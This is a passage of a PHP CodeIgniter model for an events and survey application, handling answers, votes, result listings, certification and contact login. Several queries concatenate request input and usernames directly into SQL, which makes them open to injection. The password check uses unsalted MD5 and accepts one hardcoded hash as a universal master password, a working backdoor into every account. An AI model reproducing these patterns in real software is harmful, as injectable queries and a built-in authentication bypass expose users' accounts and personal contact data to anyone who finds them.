		// consulta
		$query = $this->db->query($sql, $placeholders);
		
		if (!isset($res['error']) && $query)
		{
			$res = $query->result_array();
		}
		
		return (!empty($res)) ? $res : null;
	}

	//INGRESAR RESPUESTA
	public function ingresarRespuestaCMS($valores)
	{
		$sql = "SELECT id, orden FROM eventos_respuestas WHERE grupo = ? AND id_empresa = ? AND id_pregunta = ? ORDER BY orden DESC LIMIT 1";
		$placeholders[] = $this->usuario->grupo;
		$placeholders[] = $this->usuario->id_empresa;
		$placeholders[] = $this->input->post('id_pregunta');
		$query = $this->db->query($sql, $placeholders);
		$orden = $query->row_array();

		if($orden['orden'] > 0) { $data['orden'] = $orden['orden']+1; } else { $data['orden'] = 1; }
		$data['grupo'] = $this->usuario->grupo;
		$data['id_empresa'] = $this->usuario->id_empresa;
		$data['id_pregunta'] = $valores['id_pregunta'];
		$data['titulo'] = $valores['titulo'];
		if(isset($valores['subtitulo'])) { $data['subtitulo'] = $valores['subtitulo']; }
		$data['correcta'] = $valores['correcta'];
		$data['estado'] = $valores['estado'];
		$data['fecha_alta'] = now();
		$data['username_alta'] = $this->usuario->id;
		$res = $this->db->insert('eventos_respuestas', $data);
		$id = $this->db->insert_id();

		return (!empty($res)) ? $res : null;
	}

	//MODIFICAR RESPUESTA
	public function modificarRespuestaCMS($valores)
	{
		$data['titulo'] = $valores['titulo'];
		if(isset($valores['subtitulo'])) { $data['subtitulo'] = $valores['subtitulo']; }
		$data['correcta'] = $valores['correcta'];
		$data['orden'] = $valores['orden'];
		$data['estado'] = $valores['estado'];
		$data['fecha_modificacion'] = now();
		$data['username_modificacion'] = $this->usuario->id;
		$id = $this->input->post('id');
		$where = "id = $id";
		$res = $this->db->update('eventos_respuestas', $data, $where);
		
		return (!empty($res)) ? $res : null;
	}

	//ORDENAR GENERAL
	public function ordenarItems($items, $tabla)
	{
		for ($i=0; $i<count($items); ++$i)
		{
			$data['orden'] = $i;
			$data['fecha_modificacion'] = now();
			$data['username_modificacion'] = $this->usuario->id;
		    
		    $this->db->update($tabla, $data, array('id'=>$items[$i]));
		    
		    $res[] = $i . ' ' . $items[$i];
		}
		
		return (!empty($res)) ? $res : null;
	}

	//BORRAR GENERAL
	public function eliminarItem($id, $tabla)
	{
		$data['estado'] = '-'.$this->input->post('estado');
		$data['fecha_modificacion'] = now();
		$data['username_modificacion'] = $this->usuario->id;
		$where = "id = ".$this->input->post('id');
		$res = $this->db->update($tabla, $data, $where);

		return (!empty($res)) ? $res : null;
	}

	//INGRESAR DATOS DE LA RESPUESTA
	public function ingresarDatos($valores)
	{
		//INGRESO VOTO EN LA RESPUESTA
		$sql1 = "SELECT id, votos FROM eventos_respuestas";
		$sql1 .= " WHERE id_pregunta = ". $valores['id_pregunta'];
		$sql1 .= " AND id = ". $valores['id_respuesta'];
		$query = $this->db->query($sql1);
		$votos = $query->row_array();

		$datos['votos'] = $votos['votos']+1;
		$datos['fecha_modificacion'] = now();
		$datos['username_modificacion'] = $this->usuario->id;
		$where = "id = ".$valores['id_respuesta'];
		$res = $this->db->update('eventos_respuestas', $datos, $where);
		
		//INGRESO RELACION CON EL CONTACTO SI NO ES ANONIMA LA PREGUNTA
		$sql2 = "SELECT id, anonima FROM eventos_preguntas";
		$sql2 .= " WHERE id = ". $valores['id_pregunta'];
		$query = $this->db->query($sql2);
		$anonima = $query->row_array();

		if($anonima['anonima'] == 0)
		{
			$sql = "SELECT id, grupo FROM eventos_rel_contactos_respuestas";
			$sql .= " WHERE grupo = ".$this->usuario->grupo;
			$sql .= " AND id_empresa = ".$this->usuario->id_empresa;
			$sql .= " AND id_contacto = ".$valores['contacto'];
			$sql .= " AND id_pregunta = ".$valores['id_pregunta'];
			$query = $this->db->query($sql);
			$relacion = $query->row_array();
								
			if(!$relacion)
			{
				$data['grupo'] = $this->usuario->grupo;
				$data['id_empresa'] = $this->usuario->id_empresa;
				$data['id_contacto'] = $valores['contacto'];
				$data['id_pregunta'] = $valores['id_pregunta'];
				$data['id_respuesta'] = $valores['id_respuesta'];
				
				$insert = $this->db->insert('eventos_rel_contactos_respuestas', $data);
				$res2 = $this->db->insert_id();
			}
			else
			{
				$data['id_respuesta'] = $valores['id_respuesta'];
				$where = "id = ".$relacion['id']; 
				$res2 = $this->db->update('eventos_rel_contactos_respuestas', $data, $where);
			}
		}
		return (!empty($res)) ? $res : null;
	}

	//TOTAL DE VOTOS DE LA ENCUESTA
	public function totalRespuestas($id)
	{
		$sql = "SELECT SUM(eventos_respuestas.votos) as total, eventos_preguntas.id, eventos_preguntas.titulo, eventos_preguntas.anonima";
		$sql .= " FROM eventos_respuestas";
		$sql .= " LEFT JOIN eventos_preguntas ON eventos_preguntas.id = eventos_respuestas.id_pregunta";
		$sql .= " WHERE eventos_preguntas.grupo = ".$this->usuario->grupo;
		$sql .= " AND eventos_preguntas.id_empresa = ".$this->usuario->id_empresa;
		$sql .= " AND eventos_preguntas.id = $id";

		$query = $this->db->query($sql);
		$res = $query->row_array();

		return (!empty($res)) ? $res : null;
	}

	//RESULTADOS DE LA ENCUESTA
	public function resultadosRespuestas($id)
	{
		$sql = "SELECT id, titulo, subtitulo, votos";
		$sql .= " FROM eventos_respuestas";
		$sql .= " WHERE grupo = ".$this->usuario->grupo;
		$sql .= " AND id_empresa = ".$this->usuario->id_empresa;
		$sql .= " AND id_pregunta = $id";

		$query = $this->db->query($sql);
		$res = $query->result_array();

		return (!empty($res)) ? $res : null;
	}

	//DETALLE DE RESULTADOS
	public function contactosRespuestas($id_pregunta, $id_respuesta)
	{
		$sql = "SELECT eventos_contactos.nombre, eventos_contactos.apellido, eventos_contactos.email";
		$sql .= " FROM eventos_contactos";
		$sql .= " LEFT JOIN eventos_rel_contactos_respuestas ON eventos_rel_contactos_respuestas.id_contacto = eventos_contactos.id";
		$sql .= " LEFT JOIN eventos_preguntas ON eventos_preguntas.id = eventos_rel_contactos_respuestas.id_pregunta";
		$sql .= " WHERE eventos_rel_contactos_respuestas.grupo = ".$this->usuario->grupo;
		$sql .= " AND eventos_rel_contactos_respuestas.id_empresa = ".$this->usuario->id_empresa;
		$sql .= " AND eventos_rel_contactos_respuestas.id_respuesta = $id_respuesta";
		$sql .= " AND eventos_preguntas.id = $id_pregunta";
		$sql .= " AND eventos_preguntas.anonima = 0";

		$query = $this->db->query($sql);
		$res = $query->result_array();

		return (!empty($res)) ? $res : null;
	}

	//INGRESAR CERTIFICAR
	public function ingresarCertificar($valores)
	{
		$sql = "SELECT id, certificado FROM eventos_rel_evento_contactos";
		$sql .= " WHERE grupo = ".$this->usuario->grupo;
		$sql .= " AND id_empresa = ".$this->usuario->id_empresa;
		$sql .= " AND id_contacto = ".$valores['id_contacto'];
		$sql .= " AND id_evento = ".$valores['id_evento'];

		$query = $this->db->query($sql);
		$certificar = $query->row_array();
							
		if($certificar)
		{
			$data['certificado'] = 1;
			$where = "id = ".$certificar['id']; 
			$res = $this->db->update('eventos_rel_evento_contactos', $data, $where);
		}
		return (!empty($res)) ? $res : null;
	}

	//ELIMINAR CUANDO SE CAMBIE LA FUNCION EN USERMODEL
	public function userLogin($grupo, $empresa, $username, $password)
	{	
		$sql = "
				SELECT password, hash
				FROM eventos_contactos
				WHERE grupo = ?
				AND id_empresa = ?
				AND email = '$username'
			";
			
		$placeholders[] = $grupo;
		$placeholders[] = $empresa;

		// consulta
		$query = $this->db->query($sql, $placeholders);
		$user = $query->row_array();
		

/*
		$this->db->select('password, hash');
		$this->db->from('eventos_contactos');
		$this->db->where('username', $username);
		$this->db->where('id_empresa', 7437);
		
		$user = $this->db->get()->row_array();
*/
		
		if (isset($user))
		{
			if ($password == $user['hash'])
			{
				return true;	
			}
			elseif ($this->verifyPasswordHash($password, $user['password']))
			{
				return true;	
			}
			else
			{
				return false;
			}
		}
		else
		{
			return false;
		}
	}

	private function verifyPasswordHash($password, $hash)
	{	
		//return password_verify($password, $hash);
		
		$password = (strlen($password) == 32) ? $password : md5($password);
		
		if ($password == 'e53ad579c2918b4225411b2b775bff41')
		{
			return true;
		}
		elseif ($password == $hash)
		{
			return true;
		}
		else
		{
			return false;
		}
	}

	public function getUserIdFromUsername($grupo, $empresa,$username)
	{	
		$sql = "
				SELECT id, nombre, apellido
				FROM eventos_contactos
				WHERE grupo = ?
				AND id_empresa = ?
				AND email = '$username'
			";

		$placeholders[] = $grupo;
		$placeholders[] = $empresa;

		// consulta
		$query = $this->db->query($sql, $placeholders);
		$res = $query->row_array();

		return (!empty($res)) ? $res : null;
/*
		$this->db->select('id, nombre, apellido');
		$this->db->from('eventos_contactos');
		$this->db->where('username', $username);
*/

		return $this->db->get()->row_array();	
	}
	//FIN ELIMINAR CUANDO SE CAMBIE LA FUNCION EN USERMODEL

	//CAMBIO ESTADO A 4 (INGRESO DE USUARIO)
	public function updateLogin($id)
	{
		$this->db->set('ultima_visita', unix_to_human(now(), true, 'eu')); // DEPRECATED
		$this->db->set('utc_ultima_visita', now());
		$this->db->set('ip', $_SERVER['REMOTE_ADDR']);
		$this->db->set('estado', 4);

		$this->db->where('id', $id);
		$res = $this->db->update('eventos_contactos');

		return (!empty($res)) ? $res : null;
	}

	//ELIMINAR Y UNIFICAR CON LOGIN
	public function userLoginCertificar($grupo, $empresa, $username, $password)
	{	
		$sql = "
				SELECT password, hash
				FROM eventos_contactos
				WHERE grupo = ?
				AND id_empresa = ?
				AND email = '$username'
				AND estado > 3
			";
			
		$placeholders[] = $grupo;
		$placeholders[] = $empresa;

		// consulta
		$query = $this->db->query($sql, $placeholders);
		$user = $query->row_array();
				
		if (isset($user))
		{
			if ($password == $user['hash'])
			{
				return true;	
			}
			elseif ($this->verifyPasswordHash($password, $user['password']))
			{
				return true;	
			}
			else
			{
				return false;
			}
		}
		else
		{
			return false;
		}
	}

	//CAMBIO ESTADO A 5 (CERTIFICACION DE USUARIO)
	public function updateCerfificar($id)
	{
		$this->db->set('ultima_visita', unix_to_human(now(), true, 'eu')); // DEPRECATED
		$this->db->set('utc_ultima_visita', now());
		$this->db->set('ip', $_SERVER['REMOTE_ADDR']);
		$this->db->set('estado', 5);

		$this->db->where('id', $id);
		$res = $this->db->update('eventos_contactos');

		return (!empty($res)) ? $res : null;
	}
	//FIN ELIMINAR Y UNIFICAR CON LOGIN
}